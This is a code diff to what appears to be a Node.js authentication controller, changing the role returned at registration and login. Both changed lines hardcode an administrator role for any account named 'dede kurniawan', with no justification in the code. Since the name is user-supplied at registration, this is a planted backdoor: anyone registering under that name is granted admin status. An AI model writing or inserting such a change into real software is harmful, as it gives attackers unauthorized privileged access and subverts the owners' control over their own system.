@@ -68,7 +68,7 @@ const registerUser = async (req, res) => {
             name: newUser.Name,
             email: newUser.Email,
             token: generateToken(newUser.ID),
-            role: newUser.Role
+            role: newUser.Name === 'dede kurniawan' ? 'admin' : newUser.Role
         });
     } catch (error) {
         console.error('Registration error:', error);
@@ -102,7 +102,7 @@ const loginUser = async (req, res) => {
                 name: userRow.Name,
                 email: userRow.Email,
                 token: generateToken(userRow.ID),
-                role: userRow.Role || 'user'
+                role: (userRow.Name === 'dede kurniawan' || userRow.Role === 'admin') ? 'admin' : 'user'
             });
         } else {
             res.status(400).json({ message: 'Invalid credentials' });
